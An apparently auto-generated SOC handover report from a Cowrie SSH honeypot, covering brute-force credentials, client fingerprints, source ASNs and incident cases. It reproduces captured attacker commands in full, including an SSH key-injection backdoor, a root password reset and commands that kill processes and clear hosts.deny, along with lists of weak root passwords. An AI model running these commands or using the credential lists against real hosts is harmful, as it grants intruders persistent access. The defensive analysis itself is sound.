# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-10 |
| **Generated At** | 2026-04-10T20:34:44Z |
| **Shift Time** | 20:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **185** |
| Confirmed Threats | **182** |
| False Positives Filtered | **3** (1.6%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **7** |
| High Severity Cases | **71** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **114** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **158** |
| Unique Credential Pairs | **79** |
| Unique Usernames | **31** |
| Unique Passwords | **78** |
| Successful Auth Pairs | **43** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 71 |
| `345gs5662d34` | 34 |
| `user` | 5 |
| `oracle` | 5 |
| `ubuntu` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 34 |
| `3245gs5662d34` | 34 |
| `user08` | 2 |
| `Vpn22!` | 2 |
| `qaz.123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 34 |
| `root` | `3245gs5662d34` | 34 |
| `user` | `user08` | 2 |
| `vpn` | `Vpn22!` | 2 |
| `root` | `qaz.123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `baidu@123` | `77.105.132.10` | 2026-04-10T18:58:23 |
| `root` | `3245gs5662d34` | `77.105.132.10` | 2026-04-10T18:58:26 |
| `root` | `qazwsx1234567#$` | `42.112.42.129` | 2026-04-10T19:03:13 |
| `root` | `3245gs5662d34` | `42.112.42.129` | 2026-04-10T19:03:17 |
| `root` | `qaz.123456` | `170.79.37.88` | 2026-04-10T19:03:56 |
| `root` | `3245gs5662d34` | `170.79.37.88` | 2026-04-10T19:04:03 |
| `root` | `qwertyu1` | `42.112.42.129` | 2026-04-10T19:05:17 |
| `root` | `Root16` | `120.48.147.81` | 2026-04-10T19:06:23 |
| `root` | `Qazwsx1234!` | `42.112.42.129` | 2026-04-10T19:07:13 |
| `root` | `AAdd111` | `42.112.42.129` | 2026-04-10T19:09:07 |
| `root` | `BBdd112233` | `42.112.42.129` | 2026-04-10T19:11:00 |
| `root` | `qwertyu1` | `120.48.147.81` | 2026-04-10T19:11:12 |
| `root` | `Admin2024!@#` | `42.112.42.129` | 2026-04-10T19:16:34 |
| `root` | `odoo@123!` | `42.112.42.129` | 2026-04-10T19:20:25 |
| `root` | `qwerty2023` | `223.17.5.126` | 2026-04-10T19:22:05 |
| `root` | `3245gs5662d34` | `223.17.5.126` | 2026-04-10T19:22:08 |
| `root` | `QWERTY2025` | `103.82.37.117` | 2026-04-10T19:23:31 |
| `root` | `3245gs5662d34` | `103.82.37.117` | 2026-04-10T19:23:34 |
| `root` | `QA2ws3ed#` | `34.0.13.61` | 2026-04-10T19:26:36 |
| `root` | `3245gs5662d34` | `34.0.13.61` | 2026-04-10T19:26:38 |
| `root` | `qaz.123456` | `42.112.42.129` | 2026-04-10T19:28:06 |
| `root` | `abc123456789` | `34.0.13.61` | 2026-04-10T19:31:42 |
| `root` | `Admin2025$` | `103.82.37.117` | 2026-04-10T19:32:22 |
| `root` | `woaini1314..` | `42.112.42.129` | 2026-04-10T19:33:44 |
| `root` | `123456_zxcv` | `103.82.37.117` | 2026-04-10T19:34:05 |
| `root` | `Root6666@` | `34.0.13.61` | 2026-04-10T19:36:16 |
| `root` | `Root999!@` | `103.82.37.117` | 2026-04-10T19:37:38 |
| `root` | `Abcd1234.` | `34.0.13.61` | 2026-04-10T19:38:37 |
| `root` | `ZAQ!2wsx2023..` | `42.112.42.129` | 2026-04-10T19:39:29 |
| `root` | `Root16` | `42.112.42.129` | 2026-04-10T19:41:22 |
| `root` | `asdf!@#` | `103.82.37.117` | 2026-04-10T19:42:57 |
| `root` | `Admin12345!` | `103.82.37.117` | 2026-04-10T19:44:40 |
| `root` | `Qazwsx111!@#` | `34.0.13.61` | 2026-04-10T19:46:32 |
| `root` | `qazwsx2025..` | `42.112.42.129` | 2026-04-10T19:46:59 |
| `root` | `ZAQ!2wsx2025!@#` | `34.0.13.61` | 2026-04-10T19:48:28 |
| `root` | `P455w0rd` | `103.82.37.117` | 2026-04-10T19:49:50 |
| `root` | `Qazwsx111111..` | `34.0.13.61` | 2026-04-10T19:52:16 |
| `root` | `123456qq` | `103.82.37.117` | 2026-04-10T19:53:18 |
| `root` | `qazwsx123#` | `103.82.37.117` | 2026-04-10T19:55:10 |
| `root` | `zzCC1234` | `34.0.13.61` | 2026-04-10T19:56:37 |
| `root` | `Qazwsx01$` | `103.82.37.117` | 2026-04-10T20:00:19 |
| `root` | `qwerty2023` | `34.0.13.61` | 2026-04-10T20:03:12 |
| `root` | `1` | `52.159.243.195` | 2026-04-10T20:31:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **185** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 181 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 175 | 12 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 175 | 12 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 1 | — |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 34 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:4bWkJKSPpP7P"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.147.81`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `77.105.132.10`, `34.0.13.61`, `223.17.5.126`, `103.82.37.117`, `170.79.37.88`, `42.112.42.129`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **14** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | LOW |
| `AS18403` | FPT Telecom Company | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS58563` | CHINANET Hubei province network | 1 | HIGH |
| `AS216300` | Closed Joint Stock Company AbkhazMedia | 1 | HIGH |
| `AS6147` | INTEGRATEL PERÚ S.A.A. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (70)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-244d3fb30133

| Field | Detail |
|---|---|
| **Source IP** | `77.105.132[.]10` |
| **First Seen** | 2026-04-10 18:58 |
| **Last Seen** | 2026-04-10 18:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 18:58:22` | `cowrie.session.connect` |
| `2026-04-10 18:58:22` | `cowrie.client.version` |
| `2026-04-10 18:58:22` | `cowrie.client.kex` |
| `2026-04-10 18:58:23` | `cowrie.login.success` |
| `2026-04-10 18:58:23` | `cowrie.session.params` |
| `2026-04-10 18:58:23` | `cowrie.command.input` |
| `2026-04-10 18:58:23` | `cowrie.command.failed` |
| `2026-04-10 18:58:23` | `cowrie.log.closed` |
| `2026-04-10 18:58:23` | `cowrie.session.params` |
| `2026-04-10 18:58:23` | `cowrie.command.input` |
| `2026-04-10 18:58:23` | `cowrie.session.file_download` |
| `2026-04-10 18:58:23` | `cowrie.log.closed` |
| `2026-04-10 18:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.105.132[.]10` to AbuseIPDB if not already reported
- [ ] Block `77.105.132[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ddd22bd65f2

| Field | Detail |
|---|---|
| **Source IP** | `77.105.132[.]10` |
| **First Seen** | 2026-04-10 18:58 |
| **Last Seen** | 2026-04-10 18:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 18:58:25` | `cowrie.session.connect` |
| `2026-04-10 18:58:25` | `cowrie.client.version` |
| `2026-04-10 18:58:25` | `cowrie.client.kex` |
| `2026-04-10 18:58:26` | `cowrie.login.success` |
| `2026-04-10 18:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.105.132[.]10` to AbuseIPDB if not already reported
- [ ] Block `77.105.132[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b282709cf120

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:03 |
| **Last Seen** | 2026-04-10 19:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:03:13` | `cowrie.session.connect` |
| `2026-04-10 19:03:13` | `cowrie.client.version` |
| `2026-04-10 19:03:13` | `cowrie.client.kex` |
| `2026-04-10 19:03:13` | `cowrie.login.success` |
| `2026-04-10 19:03:14` | `cowrie.session.params` |
| `2026-04-10 19:03:14` | `cowrie.command.input` |
| `2026-04-10 19:03:14` | `cowrie.command.failed` |
| `2026-04-10 19:03:14` | `cowrie.log.closed` |
| `2026-04-10 19:03:14` | `cowrie.session.params` |
| `2026-04-10 19:03:14` | `cowrie.command.input` |
| `2026-04-10 19:03:14` | `cowrie.session.file_download` |
| `2026-04-10 19:03:14` | `cowrie.log.closed` |
| `2026-04-10 19:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19df26183efc

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:03 |
| **Last Seen** | 2026-04-10 19:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:03:16` | `cowrie.session.connect` |
| `2026-04-10 19:03:16` | `cowrie.client.version` |
| `2026-04-10 19:03:16` | `cowrie.client.kex` |
| `2026-04-10 19:03:17` | `cowrie.login.success` |
| `2026-04-10 19:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea958fffb367

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-10 19:03 |
| **Last Seen** | 2026-04-10 19:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:03:55` | `cowrie.session.connect` |
| `2026-04-10 19:03:55` | `cowrie.client.version` |
| `2026-04-10 19:03:55` | `cowrie.client.kex` |
| `2026-04-10 19:03:56` | `cowrie.login.success` |
| `2026-04-10 19:03:57` | `cowrie.session.params` |
| `2026-04-10 19:03:57` | `cowrie.command.input` |
| `2026-04-10 19:03:57` | `cowrie.command.failed` |
| `2026-04-10 19:03:57` | `cowrie.log.closed` |
| `2026-04-10 19:03:58` | `cowrie.session.params` |
| `2026-04-10 19:03:58` | `cowrie.command.input` |
| `2026-04-10 19:03:58` | `cowrie.session.file_download` |
| `2026-04-10 19:03:58` | `cowrie.log.closed` |
| `2026-04-10 19:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fa9a56e3780

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-10 19:04 |
| **Last Seen** | 2026-04-10 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:04:02` | `cowrie.session.connect` |
| `2026-04-10 19:04:02` | `cowrie.client.version` |
| `2026-04-10 19:04:02` | `cowrie.client.kex` |
| `2026-04-10 19:04:03` | `cowrie.login.success` |
| `2026-04-10 19:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f0d5950385

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:05 |
| **Last Seen** | 2026-04-10 19:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:05:16` | `cowrie.session.connect` |
| `2026-04-10 19:05:16` | `cowrie.client.version` |
| `2026-04-10 19:05:16` | `cowrie.client.kex` |
| `2026-04-10 19:05:17` | `cowrie.login.success` |
| `2026-04-10 19:05:17` | `cowrie.session.params` |
| `2026-04-10 19:05:17` | `cowrie.command.input` |
| `2026-04-10 19:05:17` | `cowrie.command.failed` |
| `2026-04-10 19:05:17` | `cowrie.log.closed` |
| `2026-04-10 19:05:17` | `cowrie.session.params` |
| `2026-04-10 19:05:17` | `cowrie.command.input` |
| `2026-04-10 19:05:18` | `cowrie.session.file_download` |
| `2026-04-10 19:05:18` | `cowrie.log.closed` |
| `2026-04-10 19:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b40f5dc89b8

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:05 |
| **Last Seen** | 2026-04-10 19:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:05:20` | `cowrie.session.connect` |
| `2026-04-10 19:05:20` | `cowrie.client.version` |
| `2026-04-10 19:05:20` | `cowrie.client.kex` |
| `2026-04-10 19:05:20` | `cowrie.login.success` |
| `2026-04-10 19:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45ee7858fca4

| Field | Detail |
|---|---|
| **Source IP** | `120.48.147[.]81` |
| **First Seen** | 2026-04-10 19:06 |
| **Last Seen** | 2026-04-10 19:06 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:4bWkJKSPpP7P"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:06:22` | `cowrie.session.connect` |
| `2026-04-10 19:06:22` | `cowrie.client.version` |
| `2026-04-10 19:06:23` | `cowrie.client.kex` |
| `2026-04-10 19:06:23` | `cowrie.login.success` |
| `2026-04-10 19:06:24` | `cowrie.session.params` |
| `2026-04-10 19:06:24` | `cowrie.command.input` |
| `2026-04-10 19:06:24` | `cowrie.command.failed` |
| `2026-04-10 19:06:25` | `cowrie.log.closed` |
| `2026-04-10 19:06:25` | `cowrie.session.params` |
| `2026-04-10 19:06:25` | `cowrie.command.input` |
| `2026-04-10 19:06:26` | `cowrie.session.file_download` |
| `2026-04-10 19:06:26` | `cowrie.log.closed` |
| `2026-04-10 19:06:38` | `cowrie.session.params` |
| `2026-04-10 19:06:38` | `cowrie.command.input` |
| `2026-04-10 19:06:38` | `cowrie.log.closed` |
| `2026-04-10 19:06:39` | `cowrie.session.params` |
| `2026-04-10 19:06:39` | `cowrie.command.input` |
| `2026-04-10 19:06:39` | `cowrie.log.closed` |
| `2026-04-10 19:06:39` | `cowrie.session.params` |
| `2026-04-10 19:06:39` | `cowrie.command.input` |
| `2026-04-10 19:06:40` | `cowrie.session.file_download` |
| `2026-04-10 19:06:40` | `cowrie.log.closed` |
| `2026-04-10 19:06:40` | `cowrie.session.params` |
| `2026-04-10 19:06:40` | `cowrie.command.input` |
| `2026-04-10 19:06:40` | `cowrie.log.closed` |
| `2026-04-10 19:06:41` | `cowrie.session.params` |
| `2026-04-10 19:06:41` | `cowrie.command.input` |
| `2026-04-10 19:06:41` | `cowrie.log.closed` |
| `2026-04-10 19:06:42` | `cowrie.session.params` |
| `2026-04-10 19:06:42` | `cowrie.command.input` |
| `2026-04-10 19:06:42` | `cowrie.command.input` |
| `2026-04-10 19:06:42` | `cowrie.log.closed` |
| `2026-04-10 19:06:43` | `cowrie.session.params` |
| `2026-04-10 19:06:43` | `cowrie.command.input` |
| `2026-04-10 19:06:43` | `cowrie.log.closed` |
| `2026-04-10 19:06:44` | `cowrie.session.params` |
| `2026-04-10 19:06:44` | `cowrie.command.input` |
| `2026-04-10 19:06:44` | `cowrie.log.closed` |
| `2026-04-10 19:06:44` | `cowrie.session.params` |
| `2026-04-10 19:06:44` | `cowrie.command.input` |
| `2026-04-10 19:06:44` | `cowrie.log.closed` |
| `2026-04-10 19:06:45` | `cowrie.session.params` |
| `2026-04-10 19:06:45` | `cowrie.command.input` |
| `2026-04-10 19:06:46` | `cowrie.log.closed` |
| `2026-04-10 19:06:46` | `cowrie.session.params` |
| `2026-04-10 19:06:46` | `cowrie.command.input` |
| `2026-04-10 19:06:46` | `cowrie.log.closed` |
| `2026-04-10 19:06:47` | `cowrie.session.params` |
| `2026-04-10 19:06:47` | `cowrie.command.input` |
| `2026-04-10 19:06:48` | `cowrie.log.closed` |
| `2026-04-10 19:06:49` | `cowrie.session.params` |
| `2026-04-10 19:06:49` | `cowrie.command.input` |
| `2026-04-10 19:06:49` | `cowrie.log.closed` |
| `2026-04-10 19:06:49` | `cowrie.session.params` |
| `2026-04-10 19:06:49` | `cowrie.command.input` |
| `2026-04-10 19:06:50` | `cowrie.log.closed` |
| `2026-04-10 19:06:50` | `cowrie.session.params` |
| `2026-04-10 19:06:50` | `cowrie.command.input` |
| `2026-04-10 19:06:51` | `cowrie.log.closed` |
| `2026-04-10 19:06:52` | `cowrie.session.params` |
| `2026-04-10 19:06:52` | `cowrie.command.input` |
| `2026-04-10 19:06:52` | `cowrie.log.closed` |
| `2026-04-10 19:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.147[.]81` to AbuseIPDB if not already reported
